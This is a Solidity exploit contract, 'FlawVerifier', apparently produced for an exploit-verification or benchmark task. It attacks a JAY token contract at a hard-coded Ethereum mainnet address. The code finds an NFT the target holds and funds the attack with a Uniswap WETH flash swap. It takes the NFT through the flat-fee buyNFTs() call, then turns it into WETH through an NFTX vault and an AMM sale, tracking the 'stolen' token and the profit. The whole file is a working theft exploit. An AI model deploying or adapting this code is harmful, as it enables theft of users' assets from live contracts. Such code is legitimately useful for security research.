// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function approve(address to, uint256 tokenId) external;
}

interface IERC721EnumerableLike is IERC721Like {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface IERC721AQueryableLike is IERC721Like {
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
}

interface IWalletOfOwnerLike is IERC721Like {
    function walletOfOwner(address owner) external view returns (uint256[] memory);
}

interface IERC721ReceiverLike {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IJAYLike is IERC20Like {
    function buyNFTs(
        address[] calldata erc721TokenAddress,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155TokenAddress,
        uint256[] calldata erc1155Ids,
        uint256[] calldata erc1155Amounts
    ) external payable;

    function buyJayNoNFT() external payable;
    function getBuyJayNoNFT(uint256 amount) external view returns (uint256);
    function getFees()
        external
        view
        returns (uint256 sellNftFeeEth, uint256 buyNftFeeEth, uint256 buyNftFeeJay, uint256 nextFeeUpdate);
}

interface IWETH9 is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INFTXVaultFactoryLike {
    function numVaults() external view returns (uint256);
    function vault(uint256 vaultId) external view returns (address);
}

interface INFTXVaultLike is IERC20Like {
    function assetAddress() external view returns (address);
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
}

contract FlawVerifier is IERC721ReceiverLike {
    struct VictimPlan {
        address collection;
        uint256 tokenId;
        address nftxVault;
        address salePair;
        uint256 quote;
    }

    error AlreadyExecuted();
    error NoLiquidVictimFound();
    error FlashPairUnavailable();
    error UnexpectedFlashCaller(address caller);
    error UnexpectedFlashSender(address sender);
    error InsufficientFlashProceeds(uint256 obtained, uint256 repayment);
    error RedemptionFailed(address token, uint256 tokenId);
    error JayAcquisitionFailed(uint256 ethSpent, uint256 jayObtained, uint256 jayRequired);
    error NoVaultInventoryFound();
    error TokenTransferFailed(address token, address to, uint256 amount);
    error NotEnoughVerifierFunding(uint256 ethAvailable, uint256 jayAvailable, uint256 ethRequired, uint256 jayRequired);

    address public constant TARGET = 0xf2919D1D80Aff2940274014bef534f7791906FF2;
    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2PairLike public constant FLASH_WETH_PAIR =
        IUniswapV2PairLike(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2FactoryLike public constant UNISWAP_V2_FACTORY =
        IUniswapV2FactoryLike(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2FactoryLike public constant SUSHISWAP_FACTORY =
        IUniswapV2FactoryLike(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    INFTXVaultFactoryLike public constant NFTX_FACTORY =
        INFTXVaultFactoryLike(0xBE86f647b167567525cCAAfcd6f881F1Ee558216);

    uint256 private constant MIN_BUY_JAY_NO_NFT = 0.0000001 ether;
    uint256 private constant AMM_FEE_NUMERATOR = 997;
    uint256 private constant AMM_FEE_DENOMINATOR = 1000;
    uint256 private constant FLASH_FEE_NUMERATOR = 1000;
    uint256 private constant FLASH_FEE_DENOMINATOR = 997;
    uint256 private constant FLASH_BUFFER = 0.002 ether;
    uint256 private constant MAX_JAY_SOURCE_ETH = 0.25 ether;

    bool public executed;
    address private _profitTokenAddress;
    uint256 private _profitTokenAmount;
    address public stolenCollection;
    uint256 public stolenTokenId;

    address private _plannedCollection;
    uint256 private _plannedTokenId;
    address private _plannedNftxVault;
    address private _plannedSalePair;
    uint256 private _plannedEthFee;
    uint256 private _plannedJayFee;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (executed) revert AlreadyExecuted();
        executed = true;

        (uint256 ethFee, uint256 jayFee) = _currentFlatFees();

        // exploit_paths[0]: the vulnerable contract already holds a deposited NFT from an earlier user action.
        // The verifier only discovers an already-held victim NFT that can also be liquidated through public
        // on-chain NFTX liquidity; it does not manufacture the vulnerable vault inventory itself.
        (address victimCollection, uint256 victimId, address nftxVault, address salePair) =
            _locateLiquidVictimDepositedNft();
        if (victimCollection == address(0)) revert NoLiquidVictimFound();

        stolenCollection = victimCollection;
        stolenTokenId = victimId;
        _plannedCollection = victimCollection;
        _plannedTokenId = victimId;
        _plannedNftxVault = nftxVault;
        _plannedSalePair = salePair;
        _plannedEthFee = ethFee;
        _plannedJayFee = jayFee;

        // exploit_paths[1]: first try verifier-held balances. If the fresh verifier lacks enough ETH/JAY,
        // temporarily source only the flat redemption costs with a public WETH flash swap.
        if (_canExecuteDirectly(ethFee, jayFee)) {
            _acquireJayIfNeeded(jayFee, 0);
            _redeemAndLiquidate(victimCollection, victimId, ethFee, nftxVault, salePair);
            _wrapAllEth();
        } else {
            uint256 jayEthQuote = _quoteEthNeededForJay(jayFee, MAX_JAY_SOURCE_ETH);
            if (jayEthQuote == 0) {
                jayEthQuote = MAX_JAY_SOURCE_ETH;
            }
            uint256 flashBorrowWeth = ethFee + jayEthQuote + FLASH_BUFFER;

            address token0 = FLASH_WETH_PAIR.token0();
            address token1 = FLASH_WETH_PAIR.token1();
            if (token0 != address(WETH) && token1 != address(WETH)) revert FlashPairUnavailable();

            if (token0 == address(WETH)) {
                FLASH_WETH_PAIR.swap(flashBorrowWeth, 0, address(this), abi.encode(uint256(1)));
            } else {
                FLASH_WETH_PAIR.swap(0, flashBorrowWeth, address(this), abi.encode(uint256(1)));
            }
        }

        _profitTokenAddress = address(WETH);
        _profitTokenAmount = WETH.balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitTokenAddress;
    }

    function profitAmount() external view returns (uint256) {
        return _profitTokenAmount;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721ReceiverLike.onERC721Received.selector;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != address(FLASH_WETH_PAIR)) revert UnexpectedFlashCaller(msg.sender);
        if (sender != address(this)) revert UnexpectedFlashSender(sender);

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        WETH.withdraw(borrowedWeth);

        _acquireJayIfNeeded(_plannedJayFee, _plannedEthFee);

        // exploit_paths[2]: call buyNFTs() naming the arbitrary vault-held NFT, receive it for the same flat fee,
        // then realize the stolen value through a pre-existing NFTX vault + WETH AMM exit at the fork block.
        // The NFTX mint/sale is only the economic realization step; the root-cause theft remains the flat-fee buyNFTs().
        _redeemAndLiquidate(
            _plannedCollection,
            _plannedTokenId,
            _plannedEthFee,
            _plannedNftxVault,
            _plannedSalePair
        );

        _wrapAllEth();

        uint256 repayment = _flashRepayment(borrowedWeth);
        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance < repayment) {
            revert InsufficientFlashProceeds(wethBalance, repayment);
        }
        if (!IERC20Like(address(WETH)).transfer(address(FLASH_WETH_PAIR), repayment)) {
            revert TokenTransferFailed(address(WETH), address(FLASH_WETH_PAIR), repayment);
        }
    }

    function _currentFlatFees() internal view returns (uint256 ethFee, uint256 jayFee) {
        (, ethFee, jayFee,) = IJAYLike(TARGET).getFees();
    }

    function _canExecuteDirectly(uint256 ethFee, uint256 jayFee) internal view returns (bool) {
        uint256 existingJay = IERC20Like(TARGET).balanceOf(address(this));
        if (existingJay >= jayFee && address(this).balance >= ethFee) {
            return true;
        }

        if (address(this).balance <= ethFee) {
            return false;
        }

        uint256 additionalJayNeeded = jayFee > existingJay ? jayFee - existingJay : 0;
        if (additionalJayNeeded == 0) {
            return true;
        }

        uint256 maxSpendableEth = address(this).balance - ethFee;
        uint256 quote = _quoteEthNeededForJay(additionalJayNeeded, maxSpendableEth);
        return quote != 0;
    }

    function _acquireJayIfNeeded(uint256 jayFee, uint256 ethReservedForBuy) internal {
        uint256 jayBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (jayBalance >= jayFee) {
            return;
        }

        uint256 spendableEth = address(this).balance;
        if (spendableEth <= ethReservedForBuy) {
            revert NotEnoughVerifierFunding(address(this).balance, jayBalance, ethReservedForBuy, jayFee);
        }
        spendableEth -= ethReservedForBuy;

        uint256 ethForJay = _quoteEthNeededForJay(jayFee - jayBalance, spendableEth);
        if (ethForJay == 0) {
            ethForJay = spendableEth;
        }

        uint256 jayBefore = IERC20Like(TARGET).balanceOf(address(this));
        IJAYLike(TARGET).buyJayNoNFT{value: ethForJay}();
        uint256 jayAfter = IERC20Like(TARGET).balanceOf(address(this));
        uint256 jayGained = jayAfter > jayBefore ? jayAfter - jayBefore : 0;
        if (jayAfter < jayFee) {
            revert JayAcquisitionFailed(ethForJay, jayGained, jayFee);
        }
    }

    function _redeemAndLiquidate(
        address collection,
        uint256 tokenId,
        uint256 ethFee,
        address nftxVault,
        address salePair
    ) internal {
        _buyVictimNftForFlatFee(collection, tokenId, ethFee);
        if (IERC721Like(collection).ownerOf(tokenId) != address(this)) {
            revert RedemptionFailed(collection, tokenId);
        }

        _tokenizeAndSell(collection, tokenId, nftxVault, salePair);
    }

    function _buyVictimNftForFlatFee(address collection, uint256 tokenId, uint256 ethFee) internal {
        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = collection;

        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0] = tokenId;

        IJAYLike(TARGET).buyNFTs{value: ethFee}(
            erc721TokenAddress,
            erc721Ids,
            new address[](0),
            new uint256[](0),
            new uint256[](0)
        );
    }

    function _locateLiquidVictimDepositedNft()
        internal
        view
        returns (address collection, uint256 tokenId, address nftxVault, address salePair)
    {
        uint256 vaultCount;
        try NFTX_FACTORY.numVaults() returns (uint256 count) {
            vaultCount = count;
        } catch {
            return (address(0), 0, address(0), address(0));
        }

        bool foundAnyInventory;
        VictimPlan memory best;

        (foundAnyInventory, best) = _considerVaultId(0, foundAnyInventory, best);

        for (uint256 vaultId = 1; vaultId <= vaultCount; vaultId++) {
            (foundAnyInventory, best) = _considerVaultId(vaultId, foundAnyInventory, best);
        }

        if (best.collection == address(0) && !foundAnyInventory) {
            revert NoVaultInventoryFound();
        }

        return (best.collection, best.tokenId, best.nftxVault, best.salePair);
    }

    function _considerVaultId(uint256 vaultId, bool foundAnyInventory, VictimPlan memory best)
        internal
        view
        returns (bool, VictimPlan memory)
    {
        (bool sawInventory, address candidateCollection, uint256 candidateTokenId, address candidateVault, address pair, uint256 quote) =
            _inspectVaultId(vaultId);

        if (sawInventory) {
            foundAnyInventory = true;
        }

        if (candidateCollection != address(0) && quote > best.quote) {
            best = VictimPlan({
                collection: candidateCollection,
                tokenId: candidateTokenId,
                nftxVault: candidateVault,
                salePair: pair,
                quote: quote
            });
        }

        return (foundAnyInventory, best);
    }

    function _inspectVaultId(uint256 vaultId)
        internal
        view
        returns (
            bool sawInventory,
            address collection,
            uint256 tokenId,
            address nftxVault,
            address salePair,
            uint256 wethQuote
        )
    {
        nftxVault = _vaultAt(vaultId);
        if (nftxVault == address(0)) {
            return (false, address(0), 0, address(0), address(0), 0);
        }

        collection = _vaultAsset(nftxVault);
        if (collection == address(0) || !_hasCode(collection)) {
            return (false, address(0), 0, address(0), address(0), 0);
        }

        if (_erc721BalanceOf(collection, TARGET) == 0) {
            return (false, address(0), 0, address(0), address(0), 0);
        }
        sawInventory = true;

        (bool foundTokenId, uint256 locatedTokenId) = _ownedTokenId(collection, TARGET);
        if (!foundTokenId) {
            return (true, address(0), 0, address(0), address(0), 0);
        }

        salePair = _findBestVaultWethPair(nftxVault);
        if (salePair == address(0)) {
            return (true, address(0), 0, address(0), address(0), 0);
        }

        wethQuote = _quoteWethOut(salePair, nftxVault, 1 ether);
        if (wethQuote == 0) {
            return (true, address(0), 0, address(0), address(0), 0);
        }

        tokenId = locatedTokenId;
    }

    function _vaultAt(uint256 vaultId) internal view returns (address vaultAddress) {
        try NFTX_FACTORY.vault(vaultId) returns (address candidate) {
            vaultAddress = candidate;
        } catch {}
    }

    function _vaultAsset(address vaultAddress) internal view returns (address asset) {
        try INFTXVaultLike(vaultAddress).assetAddress() returns (address assetAddress) {
            asset = assetAddress;
        } catch {}
    }

    function _findBestVaultWethPair(address vault) internal view returns (address) {
        address sushiPair = _usablePair(SUSHISWAP_FACTORY.getPair(vault, address(WETH)), vault);
        address uniPair = _usablePair(UNISWAP_V2_FACTORY.getPair(vault, address(WETH)), vault);

        if (sushiPair == address(0)) {
            return uniPair;
        }
        if (uniPair == address(0)) {
            return sushiPair;
        }

        uint256 sushiQuote = _quoteWethOut(sushiPair, vault, 1 ether);
        uint256 uniQuote = _quoteWethOut(uniPair, vault, 1 ether);
        return sushiQuote >= uniQuote ? sushiPair : uniPair;
    }

    function _usablePair(address pair, address vault) internal view returns (address) {
        if (pair == address(0)) {
            return address(0);
        }

        address token0;
        address token1;
        uint112 reserve0;
        uint112 reserve1;

        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
            token0 = token0_;
        } catch {
            return address(0);
        }

        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
            token1 = token1_;
        } catch {
            return address(0);
        }

        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0_, uint112 reserve1_, uint32) {
            reserve0 = reserve0_;
            reserve1 = reserve1_;
        } catch {
            return address(0);
        }

        bool matches =
            (token0 == vault && token1 == address(WETH)) || (token1 == vault && token0 == address(WETH));
        if (!matches || reserve0 == 0 || reserve1 == 0) {
            return address(0);
        }

        return pair;
    }

    function _tokenizeAndSell(address collection, uint256 tokenId, address nftxVault, address salePair)
        internal
        returns (uint256 wethOut)
    {
        IERC721Like(collection).approve(nftxVault, tokenId);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;

        uint256 vaultBefore = IERC20Like(nftxVault).balanceOf(address(this));
        INFTXVaultLike(nftxVault).mint(tokenIds, amounts);
        uint256 vaultAmountIn = IERC20Like(nftxVault).balanceOf(address(this)) - vaultBefore;

        wethOut = _swapExactTokenForWeth(nftxVault, salePair, vaultAmountIn);
    }

    function _swapExactTokenForWeth(address tokenIn, address pair, uint256 amountIn) internal returns (uint256 amountOut) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        if (token0 == tokenIn && token1 == address(WETH)) {
            amountOut = _getAmountOut(amountIn, reserve0, reserve1);
            if (!IERC20Like(tokenIn).transfer(pair, amountIn)) {
                revert TokenTransferFailed(tokenIn, pair, amountIn);
            }
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
            return amountOut;
        }

        if (token1 == tokenIn && token0 == address(WETH)) {
            amountOut = _getAmountOut(amountIn, reserve1, reserve0);
            if (!IERC20Like(tokenIn).transfer(pair, amountIn)) {
                revert TokenTransferFailed(tokenIn, pair, amountIn);
            }
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
            return amountOut;
        }

        return 0;
    }

    function _quoteEthNeededForJay(uint256 jayNeeded, uint256 maxSpendableEth) internal view returns (uint256) {
        if (jayNeeded == 0 || maxSpendableEth <= MIN_BUY_JAY_NO_NFT) {
            return 0;
        }

        uint256 high = MIN_BUY_JAY_NO_NFT + 1;
        uint256 highQuote = _safeBuyJayQuote(high);
        while (high < maxSpendableEth && highQuote < jayNeeded) {
            uint256 nextHigh = high * 2;
            if (nextHigh <= high || nextHigh > maxSpendableEth) {
                high = maxSpendableEth;
            } else {
                high = nextHigh;
            }
            highQuote = _safeBuyJayQuote(high);
            if (highQuote == 0) {
                return 0;
            }
        }

        if (highQuote < jayNeeded) {
            return 0;
        }

        uint256 low = MIN_BUY_JAY_NO_NFT + 1;
        while (low < high) {
            uint256 mid = low + (high - low) / 2;
            uint256 midQuote = _safeBuyJayQuote(mid);
            if (midQuote == 0) {
                return 0;
            }

            if (midQuote >= jayNeeded) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        return high;
    }

    function _safeBuyJayQuote(uint256 amount) internal view returns (uint256 quote) {
        try IJAYLike(TARGET).getBuyJayNoNFT(amount) returns (uint256 quotedAmount) {
            quote = quotedAmount;
        } catch {}
    }

    function _erc721BalanceOf(address token, address owner) internal view returns (uint256 balance) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC721Like.balanceOf.selector, owner));
        if (!success || data.length < 32) {
            return 0;
        }
        balance = abi.decode(data, (uint256));
    }

    function _ownedTokenId(address token, address owner) internal view returns (bool found, uint256 tokenId) {
        (found, tokenId) = _tokenOfOwnerByIndex(token, owner, 0);
        if (found) {
            return (true, tokenId);
        }

        (found, tokenId) = _tokensOfOwner(token, owner);
        if (found) {
            return (true, tokenId);
        }

        return _walletOfOwner(token, owner);
    }

    function _tokenOfOwnerByIndex(address token, address owner, uint256 index)
        internal
        view
        returns (bool found, uint256 tokenId)
    {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC721EnumerableLike.tokenOfOwnerByIndex.selector, owner, index)
        );
        if (!success || data.length < 32) {
            return (false, 0);
        }
        return (true, abi.decode(data, (uint256)));
    }

    function _tokensOfOwner(address token, address owner) internal view returns (bool found, uint256 tokenId) {
        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC721AQueryableLike.tokensOfOwner.selector, owner));
        if (!success || data.length < 32) {
            return (false, 0);
        }

        uint256[] memory tokenIds = abi.decode(data, (uint256[]));
        if (tokenIds.length == 0) {
            return (false, 0);
        }
        return (true, tokenIds[0]);
    }

    function _walletOfOwner(address token, address owner) internal view returns (bool found, uint256 tokenId) {
        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IWalletOfOwnerLike.walletOfOwner.selector, owner));
        if (!success || data.length < 32) {
            return (false, 0);
        }

        uint256[] memory tokenIds = abi.decode(data, (uint256[]));
        if (tokenIds.length == 0) {
            return (false, 0);
        }
        return (true, tokenIds[0]);
    }

    function _quoteWethOut(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        if (token0 == tokenIn && token1 == address(WETH)) {
            return _getAmountOut(amountIn, reserve0, reserve1);
        }
        if (token1 == tokenIn && token0 == address(WETH)) {
            return _getAmountOut(amountIn, reserve1, reserve0);
        }
        return 0;
    }

    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
        return ((amount * FLASH_FEE_NUMERATOR) / FLASH_FEE_DENOMINATOR) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * AMM_FEE_NUMERATOR;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * AMM_FEE_DENOMINATOR) + amountInWithFee;
        return numerator / denominator;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _hasCode(address account) internal view returns (bool) {
        return account != address(0) && account.code.length != 0;
    }
}
